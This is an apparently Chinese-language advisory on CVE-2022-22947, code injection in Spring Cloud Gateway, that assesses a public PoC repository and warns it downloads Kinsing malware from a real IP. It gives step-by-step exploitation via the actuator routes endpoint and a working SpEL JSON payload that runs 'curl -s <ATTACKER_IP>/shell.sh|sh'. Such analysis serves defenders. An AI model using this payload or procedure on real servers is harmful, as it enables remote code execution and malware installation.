## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator 端点已启用、公开且未受保护。

**POC 可用性:** 是

**投毒风险:** 85%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意的 SpEL 表达式来执行任意代码。 

**有效性：**
根据漏洞信息、搜索结果和提供的 POC 代码，该漏洞利用是有效的。POC 通过向 `/actuator/gateway/routes` 端点发送 POST 请求来创建新的路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。然后刷新路由，并通过访问新创建的路由触发代码执行。最后删除该路由。

**投毒风险：**
提供的 POC 代码存在较高的投毒风险。具体体现在：
1.  **恶意脚本下载和执行：** POC 代码中的 SpEL 表达式尝试从远程服务器（如 `94.103.87.71/scg.sh` ）下载并执行 shell 脚本。 这允许攻击者注入任意恶意代码，例如下载和安装 Kinsing 恶意软件。
2.  **后门植入：** 下载的 shell 脚本可能包含后门代码，允许攻击者在受害者系统上保持持久访问。
3. ** Kinsing恶意软件:** 通过分析shell脚本，发现最终目的是下载并安装 Kinsing 恶意软件

因此，此存储库的投毒风险非常高，约为 85%。使用此POC需要谨慎，务必在隔离环境中进行分析，确保不会对本地环境造成风险。

**利用方式：**
1.  **检查 Actuator 端点：** 确认目标 Spring Cloud Gateway 实例的 Actuator 端点是否启用、公开且未受保护。
2.  **创建恶意路由：** 使用 POST 请求向 `/actuator/gateway/routes` 端点创建一个新的路由。在路由的 `filters` 部分，使用 `AddResponseHeader` 过滤器，并在 `value` 字段中插入包含恶意 SpEL 表达式的代码。 例如:

   ```json
   {
	 "id": "poc",
	 "filters": [{
	   "name": "AddResponseHeader",
	   "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl -s <ATTACKER_IP>/shell.sh|sh\"}).getInputStream()))}"}
	   }],
	 "uri": "http://example.com",
	 "order": 0
	}
   ```

3.  **刷新路由：** 使用 POST 请求向 `/actuator/gateway/refresh` 端点发送请求，以刷新所有路由。
4.  **触发代码执行：** 访问新创建的路由，触发 SpEL 表达式的执行。
5.  **清理：** 使用 DELETE 请求向 `/actuator/gateway/routes/{route_id}` 端点删除创建的恶意路由。

**项目地址:** [Sumitpathania03/CVE-2022-22947](https://github.com/Sumitpathania03/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)